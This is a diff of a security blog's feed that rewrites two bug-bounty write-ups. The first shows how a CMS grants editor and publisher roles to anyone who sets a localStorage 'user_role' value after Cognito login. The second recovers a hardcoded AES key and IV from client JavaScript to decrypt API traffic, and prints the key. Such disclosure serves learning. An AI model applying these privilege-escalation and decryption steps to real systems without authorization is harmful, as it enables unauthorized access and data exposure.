-&lt;p&gt;After creating a user successfully, i have tried to login to the application but since the signed up user is not a legitmate user and no roles have been assigned to it, the application kept redirecting me to login page. The application contents were not accessible. But I was able to extract the embeded REST API locations from the page because we are able to login to the application but only the application pages are not available in the UI due to incorrect permissions.&lt;/p&gt;
+&lt;p&gt;However, upon attempting to log in with the newly created account, it was redirected back to the login page. Since the account lacked proper authorization and assigned roles, the application denied access to its contents. Nonetheless, by examining the page, embedded REST API locations were identified, indicating that successful authentication was achieved. The only issue pertained to incorrect permissions preventing access to application pages.&lt;/p&gt;
 
-&lt;p&gt;So i have decided to circle back to the login request to understand the flow and what we are missing, after successfull login the application serves the authorization token (JWT) in the Location header along with the URL. I was able to decode the JWT and it doesn’t has any values for the cognito permission which solve the question why the contents are unavailable.&lt;/p&gt;
+&lt;p&gt;To understand the flow and identify potential missing elements, a detailed analysis of the login request was conducted. Upon successful login, the application provided an authorization token (JWT) in the Location header. Decoding the JWT revealed that it did not contain any values for Cognito permissions, thereby explaining the unavailability of application contents.&lt;/p&gt;
 
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;at_hash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ry3UaTl8rD1IPBffLSyQ7w&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
@@ -268,66 +1053,71 @@
   &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;email&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nj@tvhsecurity.com&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;After decoding the JWT, it showed that the user doesn’t have any assigned roles to access the application pages.&lt;/p&gt;
 
-&lt;h3 id=&quot;fuzzing-jwt&quot;&gt;Fuzzing JWT&lt;/h3&gt;
-&lt;p&gt;In order to find the right &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cognito groups&lt;/code&gt; we have to fuzz the JWT payload but by adding random role permissions keywords, encoding it and sending it in the request turned to be a failure.&lt;/p&gt;
+&lt;p&gt;The decoded JWT revealed that the user did not possess any assigned roles to access the application pages.&lt;/p&gt;
 
-&lt;p&gt;But with the token i was able to download page source through curl by passing the &lt;strong&gt;authorization header&lt;/strong&gt;. After downloading the page source i have used one of my own oneliners to extract the URL locations embeded in the application and I was able to successfull get a few static pages and REST API paths. We can also the &lt;a href=&quot;https://github.com/thevillagehacker/urlscrapy&quot;&gt;URLScrapy&lt;/a&gt; a tool to extract the embeded location in the web page.&lt;/p&gt;
+&lt;h3 id=&quot;fuzzing-the-jwt&quot;&gt;Fuzzing the JWT&lt;/h3&gt;
+&lt;p&gt;In an attempt to identify the correct “Cognito groups,” the JWT payload was fuzzed by adding random role permission keywords. However, encoding and sending the modified JWT in the request did not yield any successful results.&lt;/p&gt;
 
-&lt;h2 id=&quot;http-response-code&quot;&gt;HTTP response code&lt;/h2&gt;
-&lt;p&gt;I have placed all of the extracted URLs in a text file and used &lt;strong&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;HTTPX&lt;/a&gt;&lt;/strong&gt; to check the status code and content length, luckily one of the page returned with different content length. After visiting the page it showed some static contents about the user role in the application.&lt;/p&gt;
+&lt;p&gt;Nevertheless, utilizing the obtained token, the page source was downloaded using curl and the “authorization header.” A personal one-liner script was then utilized to extract embedded URL locations from the application. Alternatively, the tool &lt;a href=&quot;https://github.com/thevillagehacker/urlscrapy&quot;&gt;URLScrapy&lt;/a&gt; could also be employed to achieve this.&lt;/p&gt;
 
-&lt;p&gt;So with the help of that recon i knew there are 2 user roles in the application which are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;editor&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;publisher&lt;/code&gt;. The editor user can edit the contents and pubshier can approve those new contents.&lt;/p&gt;
+&lt;h2 id=&quot;http-response-codes&quot;&gt;HTTP Response Codes&lt;/h2&gt;
+&lt;p&gt;All extracted URLs were compiled into a text file, and the tool &lt;strong&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;HTTPX&lt;/a&gt;&lt;/strong&gt; was utilized to check the status codes and content lengths. Fortunately, one of the pages returned a different content length. Upon visiting the page, static content related to user roles within the application was revealed.&lt;/p&gt;
+
+&lt;p&gt;This reconnaissance effort revealed the presence of two user roles: “editor” and “publisher.” Editors possess the ability to edit contents, while publishers can approve new content submissions made by editors.&lt;/p&gt;
 
 &lt;h2 id=&quot;checkpoint&quot;&gt;Checkpoint&lt;/h2&gt;
-&lt;p&gt;Let’s check what do we have as of now to access the application contents.&lt;/p&gt;
+&lt;p&gt;At this stage, the following elements are available for accessing the application contents:&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Newly signup account without any roles&lt;/li&gt;
-  &lt;li&gt;user roles in the application&lt;/li&gt;
-  &lt;li&gt;Working JWT token (Authorization)&lt;/li&gt;
+  &lt;li&gt;A newly signed-up account without any assigned roles&lt;/li&gt;
+  &lt;li&gt;Knowledge of user roles within the application&lt;/li&gt;
+  &lt;li&gt;A functioning JWT token (Authorization)&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Alright! now we have to find a way to assign the user roles to the token and access the application contents. After playing with dev-tools for a while i have noticed there is a variable in the local storage &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_role&lt;/code&gt; which is empty by the way for our user account. So i have set an value as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;editor&lt;/code&gt; and refreshed the page.&lt;/p&gt;
-
-&lt;p&gt;Voila! the application is checking the local storage variables as well to serve the content of the application, I was able to add and edit application contents.&lt;/p&gt;
+&lt;p&gt;With these resources in hand, the next step is to find a way to assign user roles to the token and gain access to the application contents. Through experimentation with the browser’s developer tools, it was discovered that a local storage variable, “user_role,” was present but had no value assigned for our user account. By setting its value to “editor” and refreshing the page, the application started utilizing the local storage variables to determine content access. As a result, the ability to add and edit application contents was obtained.&lt;/p&gt;
 
 &lt;h2 id=&quot;misconfiguration---2&quot;&gt;Misconfiguration - 2&lt;/h2&gt;
-&lt;p&gt;Now we are able to access the application which concludes that the application is using aws cognito groups as authentication only and it was not used for authorization because we were able to become an editor user in the application by adding value as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;editor&lt;/code&gt; to the local storage variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_role&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Having gained access to the application, it was determined that the application exclusively employs AWS Cognito groups for authentication, without utilizing them for authorization. This was evident from the fact that by merely adding the value “editor” to the local storage variable “user_role,” one could assume the role of an editor within the application.&lt;/p&gt;
 
-&lt;p&gt;So we only need an legitimate authentication token to access the REST APIs, since the authorization is not implemented.&lt;/p&gt;
+&lt;p&gt;Therefore, the only requirement to access the REST APIs was a legitimate authentication token, as authorization was not properly implemented.&lt;/p&gt;
 
 &lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;
-&lt;p&gt;I have escalated the privilege of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;publisher&lt;/code&gt; user by changing the local storage variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user_role&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;publisher&lt;/code&gt;. After refreshing the page i was able to access the publisher contents pages in which we can approve and reject contents which have been added by the editor users in the application.&lt;/p&gt;
+&lt;p&gt;Privilege escalation was achieved by modifying the “user_role” local storage variable to “publisher.” Upon refreshing the page, access to publisher content pages was obtained, enabling the approval or rejection of contents created by editor users in the application.&lt;/p&gt;
 
-&lt;p&gt;Please note that due to the non-disclosure agreement these are the only information i was allowed to share.&lt;/p&gt;
+&lt;p&gt;It should be noted that due to non-disclosure agreements, only limited information could be shared in this blog post.&lt;/p&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;
+&lt;p&gt;Thank you for reading!&lt;/p&gt;
 
-&lt;p&gt;Follow me on Twitter : &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;thevillagehacker&lt;/a&gt;&lt;/p&gt;</content><author><name>naveen</name></author><category term="blog" /><category term="Reading Js files" /><category term="Privilege Escalation" /><category term="Fuzzing" /><category term="Misconfiguration" /><summary type="html">Target Background The target is a Multi National Company who has a billion dollar market and the stocks. The nature of the application is to create, edit and update the contents of their products/services. Once the content is published the updated contents will be pushed to the live website of the product/services page. Short form it’s a Content Management System application - its a own product of the company built using reactJS.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" /><media:content medium="image" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Reverse Engineering Client side Encryption</title><link href="http://localhost:4000/reversing-client-side-encryption/" rel="alternate" type="text/html" title="Reverse Engineering Client side Encryption" /><published>2023-02-18T12:00:00+05:30</published><updated>2023-02-18T12:00:00+05:30</updated><id>http://localhost:4000/reversing%20client%20side%20encryption</id><content type="html" xml:base="http://localhost:4000/reversing-client-side-encryption/">&lt;h2 id=&quot;target-background&quot;&gt;Target Background&lt;/h2&gt;
-&lt;p&gt;Target is a web application but the same can be accessed via mobile applications as well including both android and iOS apps. The target application has a centralized CDN system which clearly shows that the target has several application with similar features and the resources served are almost same. By doing subdomain enumeration the target has more than 15 application has the same tech and all of them are served by the Amazon CDN.&lt;/p&gt;
+&lt;p&gt;For more insights and updates, follow me on Twitter: &lt;a href=&quot;https://twitter.com/thevillagehackr&quot;&gt;@thevillagehacker&lt;/a&gt;.&lt;/p&gt;</content><author><name>Naveen</name></author><category term="blog" /><category term="JavaScript Files Analysis" /><category term="Privilege Escalation" /><category term="Fuzzing" /><category term="Misconfiguration" /><summary type="html">Target Background The target of this analysis is a prominent Multinational Company (MNC) with a significant market value and stock presence. The company utilizes a Content Management System (CMS) application built with ReactJS to create, edit, and update the content for their products and services. Once the content is published, it is pushed to the live website associated with the corresponding product or service.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" /><media:content medium="image" url="http://localhost:4000/assets/images/blogs/IDOR/access-control.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Analysis of Client-Side Encryption Reverse Engineering</title><link href="http://localhost:4000/reversing-client-side-encryption/" rel="alternate" type="text/html" title="Analysis of Client-Side Encryption Reverse Engineering" /><published>2023-02-18T12:00:00+05:30</published><updated>2023-02-18T12:00:00+05:30</updated><id>http://localhost:4000/reversing%20client%20side%20encryption</id><content type="html" xml:base="http://localhost:4000/reversing-client-side-encryption/">&lt;h3 id=&quot;target-background&quot;&gt;Target Background&lt;/h3&gt;
 
-&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
-&lt;p&gt;Recon is the most important thing in finding bugs in the wide targets. While doing recon i came up with the situation which is the application has been developed to encrypt all the communication. The application is using the REST API service and the host value in the REST API calls have different subdomain. All the data body in the request and response has been coded in a way to encrypt to make sure the comms is secured. But as far as the developer decided to hardcode the encryption keys and Initialization vectors in the client side code the application is never secured even it’s coded to provide an encrypted connection.&lt;/p&gt;
+&lt;p&gt;The target is a web application accessible through both web browsers and mobile applications on Android and iOS platforms. The application utilizes a centralized CDN (Content Delivery Network) system, indicating that there are multiple applications with similar features and shared resources. Through subdomain enumeration, it was discovered that the target has more than 15 applications sharing the same technology and all served by Amazon CDN.&lt;/p&gt;
 
-&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;Reconnaissance is a crucial step in identifying vulnerabilities in wide-ranging targets. During the recon phase, an interesting scenario was encountered where the application had been developed to encrypt all communication. The application employs a REST API service, and the host value in the REST API calls differs from the actual application URL. The request and response data bodies are encoded to ensure secure communication. However, due to the developer’s decision to hardcode encryption keys and initialization vectors (IVs) in the client-side code, the application’s security is compromised, despite being coded to provide an encrypted connection.&lt;/p&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;The following elements were investigated during the reconnaissance phase:&lt;/p&gt;
+
 &lt;ul&gt;
-  &lt;li&gt;Check the technology stack - ReactJS&lt;/li&gt;
-  &lt;li&gt;CDN - Amazon CDN&lt;/li&gt;
-  &lt;li&gt;API service - REST API&lt;/li&gt;
-  &lt;li&gt;REST API host is different than actual application URL&lt;/li&gt;
-  &lt;li&gt;Check the sources that has been loaded in the debugger/sources tab in the browser dev tools&lt;/li&gt;
-  &lt;li&gt;Check the REST API comms, authorization mechanism and encryptions&lt;/li&gt;
+  &lt;li&gt;Technology stack: ReactJS&lt;/li&gt;
+  &lt;li&gt;CDN: Amazon CDN&lt;/li&gt;
+  &lt;li&gt;API service: REST API&lt;/li&gt;
+  &lt;li&gt;REST API host differs from the actual application URL&lt;/li&gt;
+  &lt;li&gt;Sources loaded in the debugger/sources tab of the browser’s development tools were examined&lt;/li&gt;
+  &lt;li&gt;REST API communications, authorization mechanism, and encryption were analyzed&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&quot;analyzing-loaded-sources&quot;&gt;Analyzing loaded sources&lt;/h2&gt;
-&lt;p&gt;As far as we know the target has a wide scope and they have same CDN system with almost similar code. And the REST API JSON bodies are encrypted so if we find a way to reverse engineer the client side encryption that will possibly lead us to exploit more vulnerablities.&lt;/p&gt;
+&lt;h3 id=&quot;analyzing-loaded-sources&quot;&gt;Analyzing Loaded Sources&lt;/h3&gt;
 
-&lt;p&gt;&lt;strong&gt;Target - abc.com&lt;/strong&gt;&lt;br /&gt;
-When the application is loaded in the browser it loads the web resources from another subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;assets.abc.com&lt;/code&gt;. It would be the good idea to check the JS files other than the chunk files which are generated by the frameworks.&lt;/p&gt;
+&lt;p&gt;Considering the wide scope of the target and the shared CDN system, it was decided to examine the JavaScript (JS) files, excluding the chunk files generated by frameworks.&lt;/p&gt;
 
-&lt;h3 id=&quot;files-found&quot;&gt;Files found&lt;/h3&gt;
+&lt;h4 id=&quot;files-discovered&quot;&gt;Files Discovered&lt;/h4&gt;
+
+&lt;p&gt;The following JS files were identified:&lt;/p&gt;
+
 &lt;ul&gt;
   &lt;li&gt;booking.js&lt;/li&gt;
   &lt;li&gt;desktop.js&lt;/li&gt;
@@ -338,7 +1128,7 @@ When the application is loaded in the browser it loads the web resources from an
   &lt;li&gt;main.js&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;By going through all the js files to check for keywords like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enc, encrypt, key, IV, initialization, vector&lt;/code&gt; found nothing. But when i checked the &lt;strong&gt;main.js&lt;/strong&gt; file i came up with few handy details which was worth checking for.&lt;/p&gt;
+&lt;p&gt;An in-depth analysis of all JS files was performed to identify keywords such as “enc,” “encrypt,” “key,” “IV,” “initialization,” and “vector.” However, no significant findings were obtained from these files. However, further investigation of the &lt;strong&gt;main.js&lt;/strong&gt; file revealed valuable information.&lt;/p&gt;
 
 &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;91622&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
       &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;use strict&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -369,13 +1159,13 @@ When the application is loaded in the browser it loads the web resources from an
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;After analyzing the code, finally i came to a conclusion that the application was loading resources from another CDN too and this main.js file only has the Initialization vector which was referred as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dataIVKey&lt;/code&gt; in the code.&lt;/p&gt;
+&lt;p&gt;A detailed analysis of the code revealed that the application also loads resources from another CDN. The &lt;strong&gt;main.js&lt;/strong&gt; file contained the initialization vector (IV) referred to as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dataIVKey&lt;/code&gt; in the code.&lt;/p&gt;
 
-&lt;p&gt;Let’s load the application in the browser and check the encryption in the REST API.&lt;/p&gt;
+&lt;p&gt;To investigate the encryption used in REST API calls, the application was loaded in the browser.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/blogs/RE/reqandresp.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Alright! let’s check the JS source files in the CDN subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdnPath: &apos;https://cdn.abc.com&apos;&lt;/code&gt;. The subdomain has lots of files but there was only one file which is different than the other files &lt;strong&gt;&lt;em&gt;app.js&lt;/em&gt;&lt;/strong&gt;. The app.js file contains the below details which we need for our further exploitation.&lt;/p&gt;
+&lt;p&gt;The JS source files on the CDN subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdnPath: &apos;https://cdn.abc.com&apos;&lt;/code&gt; were inspected. While there were numerous files present, one file stood out: &lt;strong&gt;&lt;em&gt;app.js&lt;/em&gt;&lt;/strong&gt;. This file contained the necessary details for further exploitation.&lt;/p&gt;
 
 &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;abc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;SiteSettingService&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
   &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;$cookies&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
@@ -393,7 +1183,7 @@ When the application is loaded in the browser it loads the web resources from an
   &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The JS file has the function to encrypt and decrypt the API body in the HTTP request and response. Searching the keyword &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypt&lt;/code&gt; led me right into the encryt and decrypt function code as below.&lt;/p&gt;
+&lt;p&gt;The JS file contained functions for encrypting and decrypting the API body in HTTP requests and responses. The keyword “encrypt” led to the discovery of the encryption and decryption function code shown below:&lt;/p&gt;
 
 &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;abc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;factory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;EncryptDecrypt&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
   &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;AppSettings&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
@@ -433,13 +1223,14 @@ When the application is loaded in the browser it loads the web resources from an
 &lt;p&gt;By reading the above code we clearly have an idea of what are the tools are required to break down this API encryption wall.&lt;/p&gt;
 
 &lt;h3 id=&quot;handy-tools-to-break-the-wall&quot;&gt;Handy tools to break the wall&lt;/h3&gt;
-&lt;p&gt;Encryption key = UiQ1TmNyeXBUITBuJDVDUmV0KEBRJH0=
-IV = jm8lgqa3j1d0ajus
-Encryption Mode = CBC
-Encryption Algorithm = AES&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Encryption key = UiQ1TmNyeXBUITBuJDVDUmV0KEBRJH0=&lt;/li&gt;
+  &lt;li&gt;IV = jm8lgqa3j1d0ajus&lt;/li&gt;
+  &lt;li&gt;Encryption Mode = CBC&lt;/li&gt;
+  &lt;li&gt;Encryption Algorithm = AES&lt;/li&gt;
+&lt;/ul&gt;
 
 &lt;h2 id=&quot;lets-break&quot;&gt;Let’s break&lt;/h2&gt;
-
 &lt;p&gt;I used the online AES decryption application you can find it &lt;a href=&quot;https://www.devglan.com/online-tools/aes-encryption-decryption&quot;&gt;here&lt;/a&gt;.
 Before start decrypting the json body let’s go through the code first. The below line in the code shows that the final payload is created by adding the encrypted payload and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;---&lt;/code&gt; dashes and then follwed by the base64 encoded IV.&lt;/p&gt;
 
@@ -453,7 +1244,9 @@ Before start decrypting the json body let’s go through the code first. The bel
 
 &lt;p&gt;Let’s break down the final payload  the API is sending to the server.&lt;/p&gt;
 
-&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ht2YM+y/yp4cn11iaWs/PmqQlSuLgrxMZwrQKnAt+qwRBYL2gt3uCHtPWC4soU1j0861mHg4Ij2jSJ0sq5R4iQK0lJ25hRjDf8OqwpNG97jv5jcCSNSFyYhjLqZYRGeFTLcxM7p4Jj9dl54LcXYWCPgAinKdQiPx/y9NC1g02g06HtCLFNFZlrTtJXPoFA70vkuT3VF84pHS+0yX3tVS0d0+b0AYlrePSuF8qxfnGGCcnhcbD/tCqesu3gFp3VCvZUaAnc9SzQlpF04a/D3R+izDG97FHEIFDsULmX0YOW5tEoUcsWRbDTfuswChDmrpNx6wMK8VR5+oSMF5r/y8eWEak0Xiaa9vc8J/TIt+j26pvDIgHRzCwfe7E9NpbBgiTt9OqoyZEyL61PRZ5UybCqqfj659WBKbF3B6ThQNQWw56CJDUTGp3sK59izgl4Bn3P76MvlpDC7rg4JTmprlk1BqxvMjmG/vqZn6IXUDR+TNHr+6zCfSTDkbeYKojs663BvddsrJIuhzgFryHe3DUZFnOahR1ViDanCahRZFkK97mfxUwHfAfJqkWkkpEhpAEV1ZUiBUpohmCWIYxjxtOBo9M9oiAxcAHZW9rbVu1X1KyadnRnO/i4JU40e8EmwsokGoufbi5Z5wOgK9sEO9LFTDH5LnF+UwXBM25oI3UFmwWrrYljNPdexm4iksslRUZGx1FQa1BlHQ8hGH+ch+ZOFu/AI8wfWx0v6lUiAx8ZTpmb+JQDb90S38rMIuh08frCixM9uyNiP1ue/W6lPW4GThtLSXcT+Ua+d4xrIHaEXP4mNNSUIQwUSo2m7kq3OoxNpbvjd3EtM9EkyJEIXcI0nn7cXuTfRpmJNMzJ0mrx6wMgJkPGJVrttNfhP4/FUXj/RrG4KYt+bpHrd7vExXNYYQCHRCKjRUzvr1ON99wBkaSHzvKHz9x/i0IMQ9kNBNB3Bge9mTsHaYs3nFqQOXS+HkASZkmc0jF+dK33X2fv8tBfJvQF4FL2AFPKyvPId3cq+RWLmvWde9h19ewuLBX/0adpiDea7HgnnIH3NewQhcrCZvfWodqtmhPKowtwk1---am04bGdxYTNqMWQwYWp1cw==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ht2YM+y/yp4cn11iaWs/PmqQlSuLgrxMZwrQKnAt+qwRBYL2gt3uCHtPWC4soU1j0861mHg4Ij2jSJ0sq5R4iQK0lJ25hRjDf8OqwpNG97jv5jcCSNSFyYhjLqZYRGeFTLcxM7p4Jj9dl54LcXYWCPgAinKdQiPx/y9NC1g02g06HtCLFNFZlrTtJXPoFA70vkuT3VF84pHS+0yX3tVS0d0+b0AYlrePSuF8qxfnGGCcnhcbD/tCqesu3gFp3VCvZUaAnc9SzQlpF04a/D3R+izDG97FHEIFDsULmX0YOW5tEoUcsWRbDTfuswChDmrpNx6wMK8VR5+oSMF5r/y8eWEak0Xiaa9vc8J/TIt+j26pvDIgHRzCwfe7E9NpbBgiTt9OqoyZEyL61PRZ5UybCqqfj659WBKbF3B6ThQNQWw56CJDUTGp3sK59izgl4Bn3P76MvlpDC7rg4JTmprlk1BqxvMjmG/vqZn6IXUDR+TNHr+6zCfSTDkbeYKojs663BvddsrJIuhzgFryHe3DUZFnOahR1ViDanCahRZFkK97mfxUwHfAfJqkWkkpEhpAEV1ZUiBUpohmCWIYxjxtOBo9M9oiAxcAHZW9rbVu1X1KyadnRnO/i4JU40e8EmwsokGoufbi5Z5wOgK9sEO9LFTDH5LnF+UwXBM25oI3UFmwWrrYljNPdexm4iksslRUZGx1FQa1BlHQ8hGH+ch+ZOFu/AI8wfWx0v6lUiAx8ZTpmb+JQDb90S38rMIuh08frCixM9uyNiP1ue/W6lPW4GThtLSXcT+Ua+d4xrIHaEXP4mNNSUIQwUSo2m7kq3OoxNpbvjd3EtM9EkyJEIXcI0nn7cXuTfRpmJNMzJ0mrx6wMgJkPGJVrttNfhP4/FUXj/RrG4KYt+bpHrd7vExXNYYQCHRCKjRUzvr1ON99wBkaSHzvKHz9x/i0IMQ9kNBNB3Bge9mTsHaYs3nFqQOXS+HkASZkmc0jF+dK33X2fv8tBfJvQF4FL2AFPKyvPId3cq+RWLmvWde9h19ewuLBX/0adpiDea7HgnnIH3NewQhcrCZvfWodqtmhPKowtwk1---am04bGdxYTNqMWQwYWp1cw==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;In the last line in the final payload there are 3 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;---&lt;/code&gt; dashes and followed by base64 encoded string which is the dataIV.&lt;/p&gt;
@@ -515,8 +1308,9 @@ Before start decrypting the json body let’s go through the code first. The bel
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;&lt;em&gt;Newly constructed request&lt;/em&gt;&lt;/strong&gt;
-&lt;img src=&quot;/assets/images/blogs/RE/reqandresp2.png&quot; alt=&quot;img&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Newly constructed request&lt;/strong&gt;&lt;/p&gt;
+
